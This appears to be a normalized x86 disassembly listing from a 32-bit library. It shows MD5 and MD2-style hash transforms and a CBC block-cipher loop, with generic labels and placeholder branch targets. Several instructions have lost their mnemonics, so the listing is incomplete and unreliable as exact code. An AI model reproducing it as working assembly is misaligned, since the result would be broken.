sub esi 0x3f
push esi
push ebx
call sub_10040350
mov ecx 0x10
xor eax eax
mov edi esi
mov [ ebx + 0x58 ] 0x0
[ edi ]
mov eax [ esp + 0x1c ]
mov ecx [ ebx ]
add esp 0xc
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ ebx + 0x4 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ ebx + 0x8 ]
inc eax
mov [ eax ] cl
mov edx ecx
inc eax
pop edi
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
pop esi
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ebx [ ebx + 0xc ]
inc eax
mov ecx ebx
shr ecx 0x8
mov [ eax ] bl
inc eax
mov edx ebx
mov [ eax ] cl
inc eax
shr edx 0x10
shr ebx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] bl
mov eax 0x1
pop ebx
retn
mov ecx 0x40
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
push 0x1
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
[ edi ]
xor edi edi
call sub_10040350
add esp 0xc
sub_10040350
mov eax 0x40
call sub_1001d0d0
mov edx [ esp + 0x4c ]
mov ecx [ esp + 0x44 ]
mov eax [ esp + 0x48 ]
push ebx
mov ebx [ ecx + 0x8 ]
push ebp
mov ebp [ ecx + 0x4 ]
push esi
mov esi edx
dec edx
test esi esi
je r-xdata
pop esi
pop ebp
pop ebx
add esp 0x40
retn
inc edx
push edi
mov [ esp + 0x4c ] edx
xor edx edx
mov dl [ eax ]
inc eax
mov esi edx
xor edx edx
mov dh [ eax ]
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or esi edx
inc eax
xor edx edx
mov [ esp + 0x48 ] esi
mov dl [ eax ]
inc eax
mov edi edx
xor edx edx
mov dh [ eax ]
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or edi edx
mov edx [ ecx + 0xc ]
mov [ esp + 0x24 ] edi
mov edi edx
xor edi ebx
inc eax
and edi ebp
xor edi edx
mov edx [ ecx ]
add edi esi
lea esi [ edi + edx - 0x28955b88 ]
xor edx edx
mov dl [ eax ]
rol esi 0x7
add esi ebp
mov edi edx
inc eax
xor edx edx
mov dh [ eax ]
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or edi edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x40 ] edi
mov edi ebx
xor edi ebp
inc eax
and edi esi
xor edi ebx
add edi edx
mov edx [ ecx + 0xc ]
lea edi [ edi + edx - 0x173848aa ]
xor edx edx
mov dl [ eax ]
rol edi 0xc
add edi esi
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx ebp
xor ebx esi
mov [ esp + 0x1c ] edx
mov edx [ ecx + 0x8 ]
and ebx edi
xor ebx ebp
mov ebp [ esp + 0x40 ]
add ebx ebp
inc eax
lea ebp [ ebx + edx + 0x242070db ]
xor edx edx
mov dl [ eax ]
xor ebx ebx
mov bh [ eax + 0x1 ]
rol ebp 0x11
add ebp edi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx edi
xor ebx esi
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x1c ]
and ebx ebp
xor ebx esi
inc eax
add ebx edx
mov edx [ ecx + 0x4 ]
lea edx [ ebx + edx - 0x3e423112 ]
xor ebx ebx
rol edx 0x16
add edx ebp
mov bh [ eax + 0x1 ]
mov [ esp + 0x58 ] edx
xor edx edx
mov dl [ eax ]
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x14 ] edx
mov edx edi
xor edx ebp
inc eax
and edx ebx
mov ebx [ esp + 0x38 ]
xor edx edi
add edx ebx
lea esi [ edx + esi - 0xa83f051 ]
mov edx [ esp + 0x58 ]
rol esi 0x7
add esi edx
xor edx edx
mov dl [ eax ]
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x30 ] edx
mov edx ebp
xor edx ebx
mov ebx [ esp + 0x14 ]
and edx esi
inc eax
xor edx ebp
add edx ebx
xor ebx ebx
mov bh [ eax + 0x1 ]
lea edi [ edx + edi + 0x4787c62a ]
xor edx edx
mov dl [ eax ]
rol edi 0xc
add edi esi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
inc eax
mov [ esp + 0x5c ] edx
mov edx [ esp + 0x58 ]
mov ebx edx
xor ebx esi
and ebx edi
xor ebx edx
mov edx [ esp + 0x30 ]
add ebx edx
xor edx edx
mov dl [ eax ]
lea ebp [ ebx + ebp - 0x57cfb9ed ]
xor ebx ebx
mov bh [ eax + 0x1 ]
rol ebp 0x11
add ebp edi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x5c ]
mov [ esp + 0x28 ] edx
mov edx edi
xor edx esi
inc eax
and edx ebp
xor edx esi
add edx ebx
mov ebx [ esp + 0x58 ]
lea edx [ edx + ebx - 0x2b96aff ]
xor ebx ebx
rol edx 0x16
add edx ebp
mov bh [ eax + 0x1 ]
mov [ esp + 0x58 ] edx
xor edx edx
mov dl [ eax ]
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x44 ] edx
mov edx edi
xor edx ebp
inc eax
and edx ebx
mov ebx [ esp + 0x28 ]
xor edx edi
add edx ebx
xor ebx ebx
mov bh [ eax + 0x1 ]
lea esi [ edx + esi + 0x698098d8 ]
mov edx [ esp + 0x58 ]
rol esi 0x7
add esi edx
xor edx edx
mov dl [ eax ]
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x20 ] edx
mov edx ebp
xor edx ebx
mov ebx [ esp + 0x44 ]
and edx esi
inc eax
xor edx ebp
add edx ebx
xor ebx ebx
mov bh [ eax + 0x1 ]
lea edi [ edx + edi - 0x74bb0851 ]
xor edx edx
mov dl [ eax ]
rol edi 0xc
add edi esi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
inc eax
mov [ esp + 0x3c ] edx
mov edx [ esp + 0x58 ]
mov ebx edx
xor ebx esi
and ebx edi
xor ebx edx
mov edx [ esp + 0x20 ]
add ebx edx
xor edx edx
mov dl [ eax ]
lea ebp [ ebx + ebp - 0xa44f ]
xor ebx ebx
mov bh [ eax + 0x1 ]
rol ebp 0x11
add ebp edi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x3c ]
mov [ esp + 0x18 ] edx
mov edx edi
xor edx esi
inc eax
and edx ebp
xor edx esi
add edx ebx
mov ebx [ esp + 0x58 ]
lea edx [ edx + ebx - 0x76a32842 ]
xor ebx ebx
rol edx 0x16
add edx ebp
mov bh [ eax + 0x1 ]
mov [ esp + 0x58 ] edx
xor edx edx
mov dl [ eax ]
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x34 ] edx
mov edx edi
xor edx ebp
inc eax
and edx ebx
mov ebx [ esp + 0x18 ]
xor edx edi
add edx ebx
xor ebx ebx
mov bh [ eax + 0x1 ]
lea esi [ edx + esi + 0x6b901122 ]
mov edx [ esp + 0x58 ]
rol esi 0x7
add esi edx
xor edx edx
mov dl [ eax ]
inc eax
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
mov ebx [ esp + 0x58 ]
mov [ esp + 0x10 ] edx
mov edx ebp
xor edx ebx
mov ebx [ esp + 0x34 ]
and edx esi
inc eax
xor edx ebp
add edx ebx
xor ebx ebx
mov bh [ eax + 0x1 ]
lea edi [ edx + edi - 0x2678e6d ]
xor edx edx
mov dl [ eax ]
rol edi 0xc
add edi esi
inc eax
or edx ebx
inc eax
xor ebx ebx
mov [ esp + 0x54 ] edi
mov bl [ eax ]
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x18
or edx ebx
inc eax
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x58 ]
mov ebx edx
xor ebx esi
and ebx edi
xor ebx edx
mov edx [ esp + 0x10 ]
add ebx edx
mov edx edi
xor edx esi
lea ebp [ ebx + ebp - 0x5986bc72 ]
mov ebx [ esp + 0x2c ]
rol ebp 0x11
add ebp edi
and edx ebp
xor edx esi
add edx ebx
mov ebx [ esp + 0x58 ]
lea edx [ edx + ebx + 0x49b40821 ]
mov ebx ebp
rol edx 0x16
add edx ebp
xor ebx edx
and ebx edi
mov edi [ esp + 0x24 ]
xor ebx ebp
add ebx edi
mov edi edx
lea esi [ ebx + esi - 0x9e1da9e ]
mov ebx [ esp + 0x30 ]
rol esi 0x5
add esi edx
xor edi esi
and edi ebp
xor edi edx
add edi ebx
mov ebx [ esp + 0x54 ]
lea edi [ edi + ebx - 0x3fbf4cc0 ]
mov ebx [ esp + 0x3c ]
rol edi 0x9
add edi esi
mov [ esp + 0x54 ] edi
xor edi esi
and edi edx
xor edi esi
add edi ebx
lea ebp [ edi + ebp + 0x265e5a51 ]
mov edi [ esp + 0x54 ]
rol ebp 0xe
add ebp edi
mov ebx edi
xor ebx ebp
and ebx esi
xor ebx edi
mov edi [ esp + 0x48 ]
add ebx edi
mov edi ebp
lea edx [ ebx + edx - 0x16493856 ]
mov ebx [ esp + 0x54 ]
rol edx 0x14
add edx ebp
xor edi edx
and edi ebx
mov ebx [ esp + 0x14 ]
xor edi ebp
add edi ebx
mov ebx [ esp + 0x20 ]
lea esi [ edi + esi - 0x29d0efa3 ]
mov edi edx
rol esi 0x5
add esi edx
xor edi esi
and edi ebp
xor edi edx
add edi ebx
mov ebx [ esp + 0x54 ]
lea edi [ edi + ebx + 0x2441453 ]
mov ebx [ esp + 0x2c ]
rol edi 0x9
add edi esi
mov [ esp + 0x54 ] edi
xor edi esi
and edi edx
xor edi esi
add edi ebx
lea ebp [ edi + ebp - 0x275e197f ]
mov edi [ esp + 0x54 ]
rol ebp 0xe
add ebp edi
mov ebx edi
xor ebx ebp
and ebx esi
xor ebx edi
mov edi [ esp + 0x38 ]
add ebx edi
mov edi ebp
lea edx [ ebx + edx - 0x182c0438 ]
mov ebx [ esp + 0x54 ]
rol edx 0x14
add edx ebp
xor edi edx
and edi ebx
mov ebx [ esp + 0x44 ]
xor edi ebp
add edi ebx
mov ebx [ esp + 0x10 ]
lea esi [ edi + esi + 0x21e1cde6 ]
mov edi edx
rol esi 0x5
add esi edx
xor edi esi
and edi ebp
xor edi edx
add edi ebx
mov ebx [ esp + 0x54 ]
lea edi [ edi + ebx - 0x3cc8f82a ]
mov ebx [ esp + 0x1c ]
rol edi 0x9
add edi esi
mov [ esp + 0x54 ] edi
xor edi esi
and edi edx
xor edi esi
add edi ebx
lea ebp [ edi + ebp - 0xb2af279 ]
mov edi [ esp + 0x54 ]
rol ebp 0xe
add ebp edi
mov ebx edi
xor ebx ebp
and ebx esi
xor ebx edi
mov edi [ esp + 0x28 ]
add ebx edi
mov edi ebp
lea edx [ ebx + edx + 0x455a14ed ]
mov ebx [ esp + 0x54 ]
rol edx 0x14
add edx ebp
xor edi edx
and edi ebx
mov ebx [ esp + 0x34 ]
xor edi ebp
add edi ebx
mov ebx [ esp + 0x40 ]
lea esi [ edi + esi - 0x561c16fb ]
mov edi edx
rol esi 0x5
add esi edx
xor edi esi
and edi ebp
xor edi edx
add edi ebx
mov ebx [ esp + 0x54 ]
lea edi [ edi + ebx - 0x3105c08 ]
mov ebx [ esp + 0x5c ]
rol edi 0x9
add edi esi
mov [ esp + 0x54 ] edi
xor edi esi
and edi edx
xor edi esi
add edi ebx
lea ebp [ edi + ebp + 0x676f02d9 ]
mov edi [ esp + 0x54 ]
rol ebp 0xe
add ebp edi
mov ebx edi
xor ebx ebp
mov [ esp + 0x58 ] ebx
and ebx esi
xor ebx edi
mov edi [ esp + 0x18 ]
add ebx edi
mov edi [ esp + 0x58 ]
lea edx [ ebx + edx - 0x72d5b376 ]
mov ebx [ esp + 0x14 ]
rol edx 0x14
add edx ebp
xor edi edx
add edi ebx
mov ebx [ esp + 0x28 ]
lea esi [ edi + esi - 0x5c6be ]
mov edi ebp
rol esi 0x4
add esi edx
xor edi edx
xor edi esi
add edi ebx
mov ebx [ esp + 0x54 ]
lea edi [ edi + ebx - 0x788e097f ]
rol edi 0xb
add edi esi
mov ebx edi
xor ebx edx
xor ebx esi
add ebx [ esp + 0x3c ]
lea ebp [ ebx + ebp + 0x6d9d6122 ]
mov ebx edi
rol ebp 0x10
add ebp edi
xor ebx ebp
mov [ esp + 0x58 ] ebx
xor ebx esi
add ebx [ esp + 0x10 ]
lea edx [ ebx + edx - 0x21ac7f4 ]
mov ebx [ esp + 0x58 ]
rol edx 0x17
add edx ebp
xor ebx edx
add ebx [ esp + 0x24 ]
lea esi [ ebx + esi - 0x5b4115bc ]
mov ebx ebp
rol esi 0x4
xor ebx edx
add esi edx
xor ebx esi
add ebx [ esp + 0x38 ]
lea edi [ ebx + edi + 0x4bdecfa9 ]
rol edi 0xb
add edi esi
mov ebx edi
xor ebx edx
xor ebx esi
add ebx [ esp + 0x5c ]
lea ebp [ ebx + ebp - 0x944b4a0 ]
mov ebx edi
rol ebp 0x10
add ebp edi
xor ebx ebp
mov [ esp + 0x58 ] ebx
xor ebx esi
add ebx [ esp + 0x20 ]
lea edx [ ebx + edx - 0x41404390 ]
mov ebx [ esp + 0x58 ]
rol edx 0x17
add edx ebp
xor ebx edx
add ebx [ esp + 0x34 ]
lea esi [ ebx + esi + 0x289b7ec6 ]
mov ebx ebp
rol esi 0x4
add esi edx
xor ebx edx
xor ebx esi
add ebx [ esp + 0x48 ]
lea edi [ ebx + edi - 0x155ed806 ]
rol edi 0xb
add edi esi
mov ebx edi
xor ebx edx
xor ebx esi
add ebx [ esp + 0x1c ]
lea ebp [ ebx + ebp - 0x2b10cf7b ]
mov ebx edi
rol ebp 0x10
add ebp edi
xor ebx ebp
mov [ esp + 0x54 ] ebp
mov [ esp + 0x58 ] ebx
xor ebx esi
add ebx [ esp + 0x30 ]
lea edx [ ebx + edx + 0x4881d05 ]
mov ebx [ esp + 0x58 ]
rol edx 0x17
add edx ebp
xor ebx edx
xor ebp edx
add ebx [ esp + 0x44 ]
lea esi [ ebx + esi - 0x262b2fc7 ]
mov ebx [ esp + 0x18 ]
rol esi 0x4
add esi edx
xor ebp esi
add ebp ebx
lea edi [ edi + ebp - 0x1924661b ]
mov ebp [ esp + 0x2c ]
rol edi 0xb
add edi esi
mov ebx edi
xor ebx edx
xor ebx esi
add ebx ebp
mov ebp [ esp + 0x54 ]
lea ebx [ ebx + ebp + 0x1fa27cf8 ]
mov ebp edi
rol ebx 0x10
add ebx edi
xor ebp ebx
mov [ esp + 0x54 ] ebx
mov ebx [ esp + 0x40 ]
xor ebp esi
add ebp ebx
mov ebx [ esp + 0x54 ]
lea edx [ edx + ebp - 0x3b53a99b ]
mov ebp [ esp + 0x54 ]
rol edx 0x17
add edx ebx
mov ebx edi
not ebx
or ebx edx
xor ebx ebp
mov ebp [ esp + 0x48 ]
add ebx ebp
lea esi [ ebx + esi - 0xbd6ddbc ]
mov ebx [ esp + 0x54 ]
rol esi 0x6
mov ebp ebx
add esi edx
not ebp
or ebp esi
xor ebp edx
add ebp [ esp + 0x5c ]
lea edi [ edi + ebp + 0x432aff97 ]
mov ebp edx
rol edi 0xa
not ebp
add edi esi
or ebp edi
xor ebp esi
add ebp [ esp + 0x10 ]
lea ebx [ ebx + ebp - 0x546bdc59 ]
mov ebp esi
rol ebx 0xf
add ebx edi
not ebp
or ebp ebx
xor ebp edi
add ebp [ esp + 0x14 ]
lea edx [ edx + ebp - 0x36c5fc7 ]
mov ebp edi
rol edx 0x15
add edx ebx
not ebp
or ebp edx
xor ebp ebx
add ebp [ esp + 0x18 ]
lea esi [ esi + ebp + 0x655b59c3 ]
mov ebp ebx
rol esi 0x6
add esi edx
not ebp
or ebp esi
xor ebp edx
add ebp [ esp + 0x1c ]
lea edi [ edi + ebp - 0x70f3336e ]
mov ebp edx
rol edi 0xa
add edi esi
not ebp
or ebp edi
xor ebp esi
add ebp [ esp + 0x20 ]
lea ebx [ ebx + ebp - 0x100b83 ]
mov ebp esi
rol ebx 0xf
add ebx edi
not ebp
or ebp ebx
xor ebp edi
add ebp [ esp + 0x24 ]
lea edx [ edx + ebp - 0x7a7ba22f ]
mov ebp edi
rol edx 0x15
add edx ebx
not ebp
or ebp edx
xor ebp ebx
add ebp [ esp + 0x28 ]
lea esi [ esi + ebp + 0x6fa87e4f ]
mov ebp ebx
rol esi 0x6
add esi edx
not ebp
or ebp esi
xor ebp edx
add ebp [ esp + 0x2c ]
lea edi [ edi + ebp - 0x1d31920 ]
mov ebp edx
rol edi 0xa
not ebp
add edi esi
or ebp edi
xor ebp esi
add ebp [ esp + 0x30 ]
lea ebx [ ebx + ebp - 0x5cfebcec ]
mov ebp esi
rol ebx 0xf
add ebx edi
not ebp
or ebp ebx
xor ebp edi
add ebp [ esp + 0x34 ]
lea edx [ edx + ebp + 0x4e0811a1 ]
mov ebp edi
rol edx 0x15
add edx ebx
not ebp
or ebp edx
xor ebp ebx
add ebp [ esp + 0x38 ]
lea esi [ esi + ebp - 0x8ac817e ]
mov ebp ebx
rol esi 0x6
add esi edx
not ebp
or ebp esi
xor ebp edx
add ebp [ esp + 0x3c ]
lea edi [ edi + ebp - 0x42c50dcb ]
mov ebp edx
rol edi 0xa
add edi esi
not ebp
or ebp edi
xor ebp esi
add ebp [ esp + 0x40 ]
lea ebx [ ebx + ebp + 0x2ad7d2bb ]
mov ebp esi
rol ebx 0xf
add ebx edi
not ebp
or ebp ebx
xor ebp edi
add ebp [ esp + 0x44 ]
lea ebp [ edx + ebp - 0x14792c6f ]
mov edx [ ecx ]
rol ebp 0x15
add edx esi
mov esi [ ecx + 0x4 ]
add ebp ebx
mov [ ecx ] edx
mov edx [ ecx + 0x8 ]
add esi ebp
add edx ebx
mov [ ecx + 0x4 ] esi
mov ebp esi
mov esi [ ecx + 0xc ]
mov [ ecx + 0x8 ] edx
mov ebx edx
mov edx [ esp + 0x4c ]
add esi edi
dec edx
mov [ ecx + 0xc ] esi
mov [ esp + 0x4c ] edx
jne r-xdata
pop edi
sub_10040cf0
mov edx [ esp + 0x4 ]
push edi
mov ecx 0x10
xor eax eax
lea edi [ edx + 0x54 ]
mov [ edx ] 0x0
[ edi ]
lea edi [ edx + 0x14 ]
mov ecx 0x10
add edx 0x4
[ edi ]
mov [ edx ] eax
pop edi
mov [ edx + 0x4 ] eax
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] eax
mov eax 0x1
retn
sub_10040d30
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
test ebp ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov eax [ ebx ]
lea edx [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi 0x10
cmp ebp edi
jb r-xdata
lea ecx [ eax + ebp ]
cmp ecx 0x10
jb r-xdata
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea edi [ ebx + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx ] ebp
mov esi ebp
shr esi 0x4
mov esi [ esp + 0x18 ]
mov ecx ebp
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx ]
pop edi
add eax ebp
pop esi
mov [ ebx ] eax
pop ebp
mov eax 0x1
pop ebx
retn
mov esi [ esp + 0x18 ]
mov ecx 0x10
sub ecx eax
lea edi [ eax + edx ]
mov eax ecx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
call sub_10040e20
mov eax [ ebx ]
mov edx [ esp + 0x20 ]
mov ecx 0x10
add esp 0x8
sub ecx eax
lea ebp [ eax + ebp - 0x10 ]
add edx ecx
mov [ ebx ] 0x0
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x18 ]
push eax
push ebx
call sub_10040e20
mov edx [ esp + 0x20 ]
add esp 0x8
add edx edi
sub ebp edi
dec esi
mov [ esp + 0x18 ] edx
jne r-xdata
sub_10040e20
mov eax 0xcc
call sub_1001d0d0
mov ecx [ esp + 0xd0 ]
push ebx
push ebp
push esi
lea esi [ ecx + 0x14 ]
lea eax [ ecx + 0x54 ]
push edi
lea edi [ esp + 0x5c ]
mov ecx [ esi + 0x3c ]
xor ebp ebp
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x9c ]
sub ecx eax
sub edi eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] ecx
sub esi eax
mov ebx [ esp + 0xe4 ]
mov edx [ eax ]
xor ecx ecx
mov [ edi + eax - 0x40 ] edx
mov cl [ ebx + ebp ]
mov ebx [ esp + 0x14 ]
xor edx ecx
mov [ edi + eax ] ecx
mov [ ebx + eax ] edx
mov edx [ esp + 0x10 ]
xor ecx edx
add eax 0x4
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esi + eax - 0x4 ]
xor ecx edx
inc ebp
mov [ esi + eax - 0x4 ] ecx
cmp ebp 0x10
mov [ esp + 0x10 ] ecx
jl r-xdata
xor ecx ecx
xor esi esi
mov ecx [ ecx * 4 + rw-data ]
mov edi [ eax - 0x4 ]
xor edi ecx
mov ecx edi
mov [ eax - 0x4 ] edi
mov ebp [ eax ]
add eax 0x20
mov ecx [ ecx * 4 + rw-data ]
xor ebp ecx
mov ecx ebp
mov [ eax - 0x20 ] ebp
mov ebx [ eax - 0x1c ]
mov ecx [ ecx * 4 + rw-data ]
xor ebx ecx
mov ecx ebx
mov [ eax - 0x1c ] ebx
mov edi [ eax - 0x18 ]
mov ecx [ ecx * 4 + rw-data ]
xor edi ecx
mov ecx edi
mov [ eax - 0x18 ] edi
mov ebp [ eax - 0x14 ]
mov ecx [ ecx * 4 + rw-data ]
xor ebp ecx
mov ecx ebp
mov [ eax - 0x14 ] ebp
mov ebx [ eax - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
xor ebx ecx
mov ecx ebx
mov [ eax - 0x10 ] ebx
mov edi [ eax - 0xc ]
mov ecx [ ecx * 4 + rw-data ]
xor edi ecx
mov ecx edi
mov [ eax - 0xc ] edi
mov ebp [ eax - 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
xor ebp ecx
dec edx
mov [ eax - 0x8 ] ebp
mov ecx ebp
jne r-xdata
add ecx esi
and ecx 0xff
inc esi
cmp esi 0x12
jl r-xdata
lea eax [ esp + 0x20 ]
mov edx 0x6
mov edi [ esp + 0x18 ]
mov ecx 0x10
lea esi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
push 0xc0
push edx
[ edi ] [ esi ]
call sub_10026870
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xcc
retn
sub_10040f80
push ebp
mov ebp [ esp + 0xc ]
push esi
mov edx [ ebp ]
lea eax [ ebp + 0x54 ]
mov [ esp + 0x10 ] eax
mov eax 0x10
sub eax edx
cmp edx 0x10
lea esi [ ebp + 0x4 ]
jge r-xdata
push esi
push ebp
call sub_10040e20
add esp 0x8
xor eax eax
lea ecx [ ebp + 0x14 ]
push ebx
mov bl al
mov ecx 0x10
mov bh bl
push edi
sub ecx edx
mov eax ebx
lea edi [ edx + esi ]
mov edx ecx
shl eax 0x10
mov ax bx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
mov dl [ ecx ]
add ecx 0x4
mov [ eax + esi ] dl
inc eax
cmp eax 0x10
jl r-xdata
push esi
push ebp
call sub_10040e20
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
add esp 0x8
xor eax eax
mov dl [ ecx ]
add ecx 0x4
mov [ eax + esi ] dl
inc eax
cmp eax 0x10
jl r-xdata
pop esi
mov eax 0x1
pop ebp
retn
sub_10041010
mov eax 0x10
call sub_1001d0d0
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
push ebx
push ebp
push esi
cmp edx 0x1
push edi
mov ebp eax
mov ebx ecx
jne r-xdata
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
cmp edi esi
je r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
jmp r-xdata
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
shr eax 0x4
mov [ esp + 0x2c ] eax
test ebp ebp
je r-xdata
shr eax 0x4
mov [ esp + 0x24 ] eax
test ebp ebp
je r-xdata
shr eax 0x4
mov [ esp + 0x24 ] eax
test ebp ebp
je r-xdata
mov dl [ ebx + eax ]
xor dl [ eax ]
inc eax
mov [ ecx + eax - 0x1 ] dl
mov edx [ esp + 0x24 ]
dec edx
mov [ esp + 0x24 ] edx
jne r-xdata
mov eax [ esp + 0x30 ]
push eax
push esi
push esi
call sub_10041ce0
mov eax [ esp + 0x38 ]
mov ebx esi
add esp 0xc
sub ebp 0x10
add edi 0x10
add esi 0x10
dec eax
mov [ esp + 0x2c ] eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
mov ecx [ edi ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x30 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ edi + 0xc ]
push edx
lea eax [ esp + 0x14 ]
push esi
push eax
mov [ esp + 0x28 ] ecx
call sub_10042290
add esp 0xc
test ebp ebp
jbe r-xdata
mov bl [ ecx + eax ]
xor [ eax ] bl
inc eax
dec edx
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
sub ebp 0x10
mov [ ecx ] edx
mov edx [ esp + 0x18 ]
add edi 0x10
add esi 0x10
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x24 ]
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
mov eax [ ebx ]
pop edi
mov [ ecx ] eax
mov edx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebx + 0xc ]
pop esi
pop ebp
mov [ ecx + 0xc ] edx
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push edi
call sub_10042290
add esp 0xc
xor ecx ecx
test ebp ebp
jbe r-xdata
mov dl [ eax + ebx ]
xor [ eax ] dl
inc eax
dec ecx
jne r-xdata
mov eax [ esp + 0x24 ]
mov ebx edi
sub ebp 0x10
add edi 0x10
add esi 0x10
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
mov edx [ ebx ]
pop edi
mov [ ecx ] edx
mov eax [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebx + 0xc ]
pop esi
pop ebp
mov [ ecx + 0xc ] eax
pop ebx
add esp 0x10
retn
